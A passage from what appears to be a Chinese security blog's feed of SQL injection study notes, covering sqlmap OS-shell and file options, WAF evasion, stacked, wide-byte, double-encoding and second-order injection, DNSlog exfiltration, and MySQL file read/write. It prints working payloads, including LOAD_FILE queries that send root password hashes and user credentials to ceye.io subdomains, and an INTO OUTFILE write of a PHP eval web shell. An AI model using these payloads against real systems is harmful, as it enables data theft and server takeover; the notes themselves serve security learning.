运行操作系统命令</h3><p><code>--os-cmd，--os-shell</code>：运行任意操作系统命令.</p><blockquote><p>在当前用户有权限使用特定的函数的前提下，如果数据库为MySQL、PostgreSQL，Sqlmap会上传一个二进制库，包含用户自定义的函数sys_exec () 和sys_eval ()，那么创建的这两个函数就可以执行系统命令。</p><p>如果数据库是微软 SQL Server时，Sqlmap通过存储过程 xp_cmdshell 来执行任意命令，如果 xp_cmdshell 被禁用(SQL Server 2005及以上版本默认被禁用)，则Sqlmap会重新启用它；如果不存在，会自动创建。</p><p>用–os-shell参数可以模拟一个真实的Shell，输入想执行的命令。当不能执行多语句时(如PHP或ASP+Mysql)，仍然可以使用 INTO OUTFILE写进可写目录，创建一个Web后门。</p><p>Sqlmap支持ASP、<a href="http://ASP.NET">ASP.NET</a>、JSP和PHP四种语言（要想执行该参数，需要有数据库管理员权限，也就是–is-dba的值要为True)。</p></blockquote><h3 id="读取文件"><a class="markdownIt-Anchor" href="#读取文件"></a> 读取文件</h3><p>该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或MicrosoftSQL Server，并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-read &quot;C:/11.txt&quot;</span><br></pre></td></tr></table></figure><h3 id="上传文件"><a class="markdownIt-Anchor" href="#上传文件"></a> 上传文件</h3><p><code>--file-write --file-dest</code>：上传文件到数据库服务器中。该命令用于写入本地文件到服务器中，当数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --file-write &quot;C:/1.txt&quot; --file-dest &quot;C:/windows/Temp/1.php&quot;</span><br></pre></td></tr></table></figure><h2 id="waf绕过-2"><a class="markdownIt-Anchor" href="#waf绕过-2"></a> <a href="https://xz.aliyun.com/t/10385">WAF绕过</a></h2><ol><li><p>WAF检测Ugent名单，使用sqlmap时可以加上参数<code>–random agent</code>（随机出现字母头），也可以自己设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--user-agent=&quot;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&quot;</span><br></pre></td></tr></table></figure></li><li><p>sqlmap的速度过快，所以会被拦截，则<strong>添加延时参数</strong> --delay参数</p></li><li><p><strong>使用代理池</strong>，随机出IP，绕过IP白名单。或者自己设置代理：<code>--proxy=http://127.0.0.1:8080</code></p></li><li><p><strong>利用–tamper参数中的编码脚本</strong></p></li><li><p><strong>自己编写中转脚本</strong></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;waf绕过&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#waf绕过&quot;&gt;&lt;/a&gt; WAF绕过&lt;/h1&gt;
&lt;img src=&quot;/images/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-WAF%E7%B</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="sql注入" scheme="https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入进阶-堆叠、二次、DNS注入、各位置注入等</title>
    <link href="https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%A0%86%E5%8F%A0%E3%80%81%E4%BA%8C%E6%AC%A1%E3%80%81DNS%E6%B3%A8%E5%85%A5%E3%80%81%E5%90%84%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5%E7%AD%89/"/>
    <id>https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%A0%86%E5%8F%A0%E3%80%81%E4%BA%8C%E6%AC%A1%E3%80%81DNS%E6%B3%A8%E5%85%A5%E3%80%81%E5%90%84%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5%E7%AD%89/</id>
    <published>2023-05-24T06:22:40.000Z</published>
    <updated>2023-05-25T01:14:52.450Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆叠注入可绕过select用法参考advance"><a class="markdownIt-Anchor" href="#堆叠注入可绕过select用法参考advance"></a> 堆叠注入（可绕过select）用法参考advance</h1><p>堆叠注入就是将一堆sql语句叠加在一起执行，使用<strong>分号</strong>结束上一个语句再叠加其他语句一起执行。试想一下我们在; 结束一个 sql语句后继续构造下一条语句, 会不会一起执行？因此这个想法也就造就了堆叠注入。</p><p>与union jection(联合注入)的区别：区别就在于 union或者 union all 执行的语句类型是<strong>有限</strong>的, 可以用来执行查询语句, 而<strong>堆叠注入可以执行的是任意的语句</strong>。</p><ul><li>但是不同的数据库有不同的注入语句。</li><li>查询时通常只返回一个结果，导致后面的SQL语句可能无法回显到页面上</li></ul><p>例子：修改数据：<code>select * from user_test;update user_test set name='modify' where name='张三';</code></p><blockquote><p>注：上面的介绍中我们已经提及，oracle不能使用堆叠注入，可以从图中看到，当有两条语句在同一行时，直接报错。无效字符。</p></blockquote><h1 id="宽字节注入二次编码注入二次注入"><a class="markdownIt-Anchor" href="#宽字节注入二次编码注入二次注入"></a> 宽字节注入&amp;&amp;二次编码注入&amp;&amp;二次注入</h1><h2 id="宽字节注入"><a class="markdownIt-Anchor" href="#宽字节注入"></a> 宽字节注入</h2><p>在mysql中，用于转义（即在字符串中的符号前加上<code>\</code>）的函数有<strong>addslashes</strong>，<strong>mysql_real_escape_string</strong>，<strong>mysql_escape_string</strong>等，还有一种情况是<strong>magic_quote_gpc</strong>，不过高版本的PHP将去除这个特性（会返回false）。</p><p>意义：php gpc开启会转义单引号，导致字符注入时无法闭合单引号，宽字节注入就可以吃掉转义字符从而进行注入。</p><p>重点：<code>%df%27</code></p><p>注意：</p><blockquote><p>我们在之前介绍过“set names gbk”其实干了三件事，等同于：<code>SET character set connection='gbk',haracter set results='gbk',character_set client='gbk'</code>，而这段是存在宽字节注入的，一旦其中一个不是gdk，例如最后一个<code>character_set client=binary</code>，那么就是不存在了。</p></blockquote><h3 id="字符集宽"><a class="markdownIt-Anchor" href="#字符集宽"></a> 字符集（宽）</h3><p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。<em><strong>宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符</strong></em>。</p><h3 id="mysql的字符集转换过程"><a class="markdownIt-Anchor" href="#mysql的字符集转换过程"></a> MySQL的字符集转换过程</h3><ol><li><p>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection;</p></li><li><p>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：（一级一级往上升，找到配置）</p><ul><li>使用每个数据字段的CHARACTER SET设定值;</li><li>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准);</li><li>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值;</li><li>若上述值不存在，则使用character_set_server设定值。</li></ul></li></ol><p>将操作结果从内部操作字符集转换为character_set_results。</p><p><strong>重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。</strong></p><h3 id="注入原理"><a class="markdownIt-Anchor" href="#注入原理"></a> 注入原理</h3><blockquote><p>GBK 占用两字节 ASCII占用一字节</p></blockquote><p>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。</p><p>大家都知道<code>%df’ </code>被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠<code>\</code>，变成了 <code>%df\’</code>，其中<code>\</code>的十六进制是<code> %5C</code> ，那么现在<code> %df\’ =%df%5c%27</code>，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为<code>%df%5c</code>是一个宽字符，也就是<code>縗</code>，也就是说：<code>%df\’ = %df%5c%27=縗’</code>（单引号逃逸），有了<strong>单引号</strong>就好注入了。</p><blockquote><p>也就是本来是1(23)，其中2用来注释3，但是因为宽字节会变成(12)3，这样3就独立出来了。所以，诀窍是让(12)成为一个可以被解析的宽字符就行。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select * from user where username=&#x27;$username&#x27;&quot;;   </span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line"><span class="number">-1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;table.name&#x27;</span> # (后面的<span class="string">&#x27;&#x27;</span>可以使用<span class="number">16</span>进制编码，编码结束后在前面加上<span class="number">0</span>x)</span><br></pre></td></tr></table></figure><h3 id="常见url编码"><a class="markdownIt-Anchor" href="#常见url编码"></a> 常见URL编码</h3><table><thead><tr><th>URL编码</th><th>注释</th></tr></thead><tbody><tr><td><code>%27</code></td><td>单引号</td></tr><tr><td><code>%20</code></td><td>空格</td></tr><tr><td><code>%23</code></td><td>#号</td></tr><tr><td><code>%5c</code></td><td><code>/</code>反斜杠</td></tr></tbody></table><p>header改为gbk：<code>header(&quot;Content-type:text/html;charset=gbk&quot;);</code></p><h3 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h3><ol><li>使用<code>mysql_set_charset(utf8)</code>指定字符集</li><li>使用<code>mysql_real_escape_string</code>进行转义</li></ol><p>这同样也是存在漏洞的，另外官方建议使用mysql_set_charset方式来设置编码，不幸的是它也只是调用了SET NAMES,所以效果也是一样的。不过mysql set_charset调用SET NAMES之后还记录了当前的编码，留着给后面mysql_real_escape_string处理字符串的时候使用，所以在后面只要合理地使用mysql_real_escape_string还是可以解决这个漏洞的，关于这个漏洞的解决方法推荐如下几种方法：</p><ol><li>在执行查询之前先执行SET NAMES’gbk’,character_set_client=-binary设置character set client binary.</li><li>使用mysql_set_charset(‘gbk’)设置编码，然后使用mysql_real_escape_string()函数被参数过滤。</li><li>使用pdo方式，在PHP5.3.6及以下版本需要设置setAttribute (PDO:ATTREMULATE_PREPARES,false);来禁用prepared statements的仿真效果。</li></ol><h2 id="二次编码注入"><a class="markdownIt-Anchor" href="#二次编码注入"></a> 二次编码注入</h2><p>二次编码注入和宽字节注入有着异曲同工之妙，都是在面对PHP代码或者配置，对输入的‘(单引号)进行转义的时候，在处理用户输入的数据时存在问题，绕开了转义。</p><p>这里不是宽字节注入的GBK编码，而是UFT-8，所以宽字节注入不管用。</p><p>重点：<code>%2527</code></p><h3 id="url编码"><a class="markdownIt-Anchor" href="#url编码"></a> URL编码</h3><p>编码肯定是因为原始的格式并不适合传输才进行的，例如<code>+，=，&amp;，;</code>等符号在http请求过程中会与原有格式进行冲突，所以需要进行编码转换。</p><blockquote><p>比如某登录场景：<code>index.php?id=1$name=admin$pwd=123</code>。账号密码中带有=号和&amp;号，就可能导致冲突，这些就需要进行url编码<br />比如：</p><ul><li>编码前：name=admin=</li><li>编码后：name=admin%3d</li></ul><p>通常后端程序会自动进行解码，比如php的<code>urldecode()</code>函数：<code>urldecode('%3d')</code></p></blockquote><h3 id="二次编码"><a class="markdownIt-Anchor" href="#二次编码"></a> 二次编码</h3><p>urldecode()与PHP本身处理编码时，两者配合失误，可以构造数据消灭斜线。</p><ol><li>当输入<code>id=1%27</code>或者<code>id=1’</code>，都会被过滤（加上了<code>\</code>）</li><li>当输入<code>id=1%2527</code>就可以让<code>%25--&gt;%</code>，所以合起来，就会变成<code>%27</code>，刚好能够注入。</li><li><img src="/images/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%A0%86%E5%8F%A0%E3%80%81%E4%BA%8C%E6%AC%A1%E3%80%81DNS%E6%B3%A8%E5%85%A5%E3%80%81%E5%90%84%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5%E7%AD%89/image-20230524142550739.png" alt="image-20230524142550739" /></li></ol><h2 id="二阶注入二次注入"><a class="markdownIt-Anchor" href="#二阶注入二次注入"></a> 二阶注入（二次注入）</h2><p>示例是由：创建用户，登录和修改密码组成。</p><p>当我们遇到特殊字符转义的时候（例如：mysql_real_escape_string）</p><blockquote><p>mysql_real_escape_string:</p><p>将转义特殊字符：<code>\x00, \n, \r, \, ', &quot;, \x1a</code></p></blockquote><p>当我们注册的用户名为<code>admin'#</code>，即使转义了，但是在数据库中是存在的，可以直接调出来，修改密码的地方并没有过滤，那么我们可以进行二次注入。</p><p><code>$sql = &quot;UPDATE users SET PASSWORD='$pass' where username='admin '#' and password='$curr_pass'&quot;;</code></p><p>好文章，待会看：</p><blockquote><p>ZZCMS v8.3二阶注入：<a href="https://www.freebuf.com/vuls/183360.html">https://www.freebuf.com/vuls/183360.html</a></p><p>ZoneMinder：<a href="https://www.4hou.com/info/news/19267.html">https://www.4hou.com/info/news/19267.html</a></p><p>Joomla3.8.2：<a href="https://blog.csdn.net/publicStr/article/details/80261667">https://blog.csdn.net/publicStr/article/details/80261667</a></p><p>二次注入漏洞挖掘：<a href="https://www.secpulse.com/archives/76506.html">https://www.secpulse.com/archives/76506.html</a></p><p>二阶注入研究论文：<a href="http://www.doc88.com/p-6931153563831.html">http://www.doc88.com/p-6931153563831.html</a></p></blockquote><h1 id="dns注入盲注dnslog外带"><a class="markdownIt-Anchor" href="#dns注入盲注dnslog外带"></a> DNS注入（盲注DNSlog外带）</h1><blockquote><p><strong>原理</strong>：首先需要有一个可以配置的域名，比如：<a href="http://ceye.io">ceye.io</a>，然后通过代理商设置域名 <a href="http://ceye.io">ceye.io</a> 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 <a href="http://ceye.io">ceye.io</a> 及其子域名的查询都会到 服务器 A 上，<strong>这时就能够实时地监控域名查询请求了</strong>，图示如下</p></blockquote><p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%A0%86%E5%8F%A0%E3%80%81%E4%BA%8C%E6%AC%A1%E3%80%81DNS%E6%B3%A8%E5%85%A5%E3%80%81%E5%90%84%E4%BD%8D%E7%BD%AE%E6%B3%A8%E5%85%A5%E7%AD%89/image-20230524142924449.png" alt="image-20230524142924449" /></p><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><p><strong>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息</strong>。</p><p>利用场景：在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，且在现代WAF的防护下，很可能导致IP被ban，这时候就要用到我们的DNSlog注入。</p><p>推荐平台：<a href="http://www.dnslog.cn">dnslog</a>, <a href="http://admin.dnslog.link">admindnslog</a>, <a href="http://ceye.io">ceye</a>, <a href="https://github.com/BugScanTeam/DNSLog">BulidDNS</a></p><h2 id="攻击"><a class="markdownIt-Anchor" href="#攻击"></a> 攻击</h2><p>目标使用Mysql：<code>SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'));</code></p><p>前人的payload：</p><ol><li><code>?id=1’ and if((select load_file(concat(’\\\\’,(select database()),’.sojcvo.ceye.io\\aaa’))),1,0)--+</code></li><li><code>?id=1' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.sojcvo.ceye.io\\aaa'))),1,0)--+</code></li><li><code>?id=1' and if((select load_file(concat('\\\\',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.sojcvo.ceye.io\\abc'))),1,0)-- +</code> 用 concat_ws() 函数分割，因为在 load_file() 里面不能使用 @ ~ 等符号分割，用 hex() 函数转成十六进制，出来结果了再转回去即可。</li></ol><p>然后在ceye.io中看输出。</p><h1 id="各位置注入"><a class="markdownIt-Anchor" href="#各位置注入"></a> 各位置注入</h1><ol><li>提交方式：get/post<ol><li>get只有一次传输</li><li>post传输头得到100 continue后再传data</li></ol></li><li>注入类型：json/数字/字符串</li><li>注入点：<ol><li>Cookie</li><li>Header：User-Agent（）可能存在有数据库的交互，记录在<code>$_SERVER</code>中</li></ol></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;堆叠注入可绕过select用法参考advance&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#堆叠注入可绕过select用法参考advance&quot;&gt;&lt;/a&gt; 堆叠注入（可绕过select）用法参考advance&lt;/h1&gt;
&lt;p&gt;堆叠注入</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="sql注入" scheme="https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入进阶-各种数据库的注入方式</title>
    <link href="https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/</id>
    <published>2023-05-23T10:24:39.000Z</published>
    <updated>2023-05-25T01:15:16.457Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h1><ul><li>什么决定网站注入点用户权限？<strong>数据库配置文件</strong></li></ul><h2 id="常用数据库"><a class="markdownIt-Anchor" href="#常用数据库"></a> 常用数据库</h2><p>常见的数据库：Access，Mysql，Mssql，mongoDB，postgresql，sqlite，oracle，sybase等</p><p>这些数据库除了Access没有数据库名外，其他都类似，有：<strong>数据库名+表名+列名+数据</strong></p><p>关系型数据库：通过外键关联来建立表与表之间的关系。由二维表及其之间的联系组成的一个数据组织。如：Oracle、DB2、MySql</p><p>非关系型数据库：通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。非关系型数据库产品是传统关系型数据库的功能阉割版本，通过减少用不到或很少用的功能，来大幅度提高产品性能。如：NoSql、Cloudant。</p><h2 id="判断sql注入数据库类型方法"><a class="markdownIt-Anchor" href="#判断sql注入数据库类型方法"></a> 判断sql注入数据库类型方法</h2><ol><li><p>如果可以，直接通过<strong>端口/默认语言</strong>判断</p><ol><li><p>默认语言搭配数据库：</p><p>组合类型asp + access/mssql<br />组合类型php + mysql<br />组合类型aspx+mssql<br />组合类型jsp +mysql/oracle<br />组合类型Python + MongoDB</p></li><li><p>常见数据库的默认端口：</p><ol><li>关系型数据库<br />mysql 3306<br />sqlserver 1433<br />oracle 1521<br />psotgresql 5432</li><li>非关系型数据库<br />MongoDB 27017<br />Redis 6379<br />memcached 11211</li></ol></li></ol></li><li><p>是否可以使用特定的函数来判断，该数据库特有的</p><ol><li>在mssql中可以调用<code>substring</code>。oracle则只可调用<code>substr</code></li><li>mssql不可以调用<code>version()</code></li></ol></li><li><p>是否可以使用辅助的符号来判断，如注释符号、多语句查询符等等</p><ol><li><code>/*</code>是MySQL中的注释符，返回错误说明该注入点不是MySQL；</li><li><code>--</code>是Oracle和MSSQL都支持的，但是<code>;</code>是Oracle不支持的，因为它不支持多行查询。</li></ol></li><li><p>是否可以编码查询</p></li><li><p>是否显可以利用错误信息</p><blockquote><p>例如：错误提示Microsoft JET Database Engine 错误 ‘80040e14’，说明是通过JET引擎连接数据库，则表明数据库为ACCESS数据库，如果是ODBC的话则说明是MSSQL数据库。</p></blockquote></li><li><p>是否存在数据库某些特性辅助判断</p><ol><li>特殊表：access(msysobjects)，mssql(sysobjects)，oracle(sys.user_tables)，mysql(information_schema)</li></ol></li></ol><p>参考：<a href="https://www.jianshu.com/p/e308d96e2ecd">https://www.jianshu.com/p/e308d96e2ecd</a></p><h1 id="mysql"><a class="markdownIt-Anchor" href="#mysql"></a> MYSQL</h1><img src="/images/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/1621405493318-f8a180c6-8b51-4ff6-8ae6-30ab8b9de48a.png" alt="MYSQL注入.png" style="zoom:80%;" /><h2 id="常见手法"><a class="markdownIt-Anchor" href="#常见手法"></a> 常见手法</h2><ol><li><p>找到注入点 <code>and 1=1</code> <code>and 1=2 </code>测试报错</p></li><li><p><code>order by 5 </code># 到5的时候报错，获取字段总数为4</p></li><li><p><code>id=0</code>(不是1就行，强行报错) <code>union select 1,2,3,4</code> # 联合查询，2和3可以显示信息</p></li><li><p>获取数据库信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">user</span>() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>root</span><br><span class="line">database() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>mozhe_Discuz_StormGroup</span><br><span class="line">version() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span><span class="number">5.7</span><span class="number">.22</span><span class="number">-0</span>ubuntu0<span class="number">.16</span><span class="number">.04</span><span class="number">.1</span></span><br></pre></td></tr></table></figure></li><li><p>获取数据库表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">table_name 表名</span><br><span class="line">information_schema.tables 系统生成信息表</span><br><span class="line">table_schema=数据库名16进制或者用单引号括起来</span><br><span class="line"></span><br><span class="line"># 改变limit 0,1中前一个参数，得到其他表</span><br></pre></td></tr></table></figure></li><li><p>获取列名</p></li><li><p>脱库</p></li></ol><h2 id="信息搜集前面提过"><a class="markdownIt-Anchor" href="#信息搜集前面提过"></a> 信息搜集（前面提过）</h2><p>在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，</span><br><span class="line">table_schema和table_name分别来存储数据库名和表名</span><br><span class="line">information_schema.tables 记录所有的表</span><br><span class="line">information_schema.columns 记录所有的列</span><br></pre></td></tr></table></figure><p><strong>MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行getshell操作，其中也会遇到很多的阻碍，相关防御手法也要明确，所谓知己知彼，百战不殆。作为安全开发工作者，攻防兼备。</strong></p><p>注入点权限是否为root，取决于连接数据库的文件。这也决定了高权限注入及低权限注入。使用<code>user()</code>进行查看，而且需要注意的是：<em>不是root权限获取不到数据库名。</em></p><h2 id="跨库查询-文件读写以及应用思路"><a class="markdownIt-Anchor" href="#跨库查询-文件读写以及应用思路"></a> 跨库查询、文件读写以及应用思路</h2><h3 id="跨库查询"><a class="markdownIt-Anchor" href="#跨库查询"></a> 跨库查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 获取所有数据库名</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata </span><br><span class="line"></span><br><span class="line"># 查表，找与网站对应的数据库名，若没有，则挨个查。或者使用 <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27;qqyw&#x27;</span></span><br><span class="line"></span><br><span class="line"># 跨库查列</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;qqyw&#x27;</span></span><br><span class="line"></span><br><span class="line"># 查结果</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,u,p <span class="keyword">from</span> qqyw.admin</span><br></pre></td></tr></table></figure><h3 id="文件读写"><a class="markdownIt-Anchor" href="#文件读写"></a> 文件读写</h3><p>会用到MySQL数据库里两个内置函数，这两个函数是MySQL数据库特有的，在其他数据库是没有的或者在其他数据库中写法不同，所以这是为什么说注入点分数据库的原因，因为每个数据库内置的安全机制和它的功能不同，这才导致在注入的时候针对不用的数据库采取的攻击思路也不同。MySQL有内置读取的操作函数，我们可以调用这个函数作为注入的攻击。</p><p><strong>读取函数</strong>：<code>load_file()</code></p><p><strong>导出函数</strong>：<code>into outfile </code>或<code>into dumpfile</code></p><h4 id="前提"><a class="markdownIt-Anchor" href="#前提"></a> 前提</h4><ol><li><p>应该设置<code>--secure-file-priv</code></p><p>否则会出现如下错误，这是因为MySQL 限制了数据的导出路径。MySQL 导入导出文件只能在<code>secure-file-priv</code>变量的指定路径下的文件才可以导入导出。如果是NULL那就是禁止输出。而如果是空，则不限制目录。</p><blockquote><p><em>The MySQL server is running with the --secure-file-priv option so it cannot execute this statement。</em></p></blockquote></li><li><p>应该对web<strong>目录需要有写权限</strong>，能够使用单引号</p></li><li><p>应该知道<strong>绝对路径</strong></p><p>读取数据库路径：<code>@@datadir</code></p></li></ol><h4 id="文件读取"><a class="markdownIt-Anchor" href="#文件读取"></a> 文件读取</h4><ol><li>只能读取绝对路径的网页文件 读取数据库路径：<code>@@datadir</code></li><li>将绝对路径转换为16进制数时，不需要使用引号</li></ol><p>语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,load_file(&#x27;C:\\inetpub\\wwwroot\\mysql-sql\\inc\\set_sql.php&#x27;),3,4</span><br></pre></td></tr></table></figure><p><strong>然后在网页源码中查看</strong></p><h4 id="文件导出写入到文件"><a class="markdownIt-Anchor" href="#文件导出写入到文件"></a> 文件导出（写入到文件）</h4><ol><li><p>知道路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select &quot;&lt;?php @eval($_POST[&#x27;123&#x27;]);?&gt;&quot; into outfile(&quot;C:/phpStudy/WWW/a.php&quot;</span><br></pre></td></tr></table></figure></li><li><p>采用PHPmyadmin，选择一个数据库如test，在数据库中<strong>新创建一个表aa</strong>，在aa中<strong>插入一个数据</strong><code>&lt;?php @eval($_POST['123']);?&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select * from aa into outfile &#x27;C:/phpStudy/WWW/a.php&#x27;; --+</span><br></pre></td></tr></table></figure></li></ol><h4 id="路径获取常见方法"><a class="markdownIt-Anchor" href="#路径获取常见方法"></a> 路径获取常见方法</h4><ol><li>报错显示：一般网站出现错误的时候它会泄露出路径；</li><li>遗留文件：站长为了调试信息的时候遗留的文件而泄露的路径。用扫描工具可以扫出；</li><li>漏洞报错：知道对方是用什么程序搭建再去网上去搜索漏洞信息：phpcms 爆路径；</li><li>平台配置文件：通过读取文件来读取搭建网站平台的配置文件。缺点：路径不是默认的，一旦更改很难找到路径；</li><li>爆破；</li></ol><h2 id="魔术引号及常见保护"><a class="markdownIt-Anchor" href="#魔术引号及常见保护"></a> 